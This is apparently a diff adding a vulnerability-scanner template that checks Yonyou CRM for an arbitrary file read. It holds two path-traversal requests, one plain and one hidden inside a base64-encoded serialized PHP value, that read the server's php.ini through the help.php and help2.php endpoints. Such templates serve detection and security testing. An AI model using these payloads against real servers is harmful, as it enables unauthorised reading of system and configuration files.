@@ -1,0 +1,12 @@
+name: yonyou-crm-help-fileread
+group:
+  - method: GET
+    path: "/pub/help2.php?key=../../apache/php.ini"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"php.ini")
+  - method: GET
+    path: "/pub/help.php?key=YTozOntpOjA7czoyNDoiLy4uLy4uLy4uL2FwYWNoZS9waHAuaW5pIjtpOjE7czoxOiIxIjtpOjI7czoxOiIyIjt9"
+    expression: |
+      response.status == 200 && response.body.bcontains(b"php.ini")
+detail:
+  author: fliggy
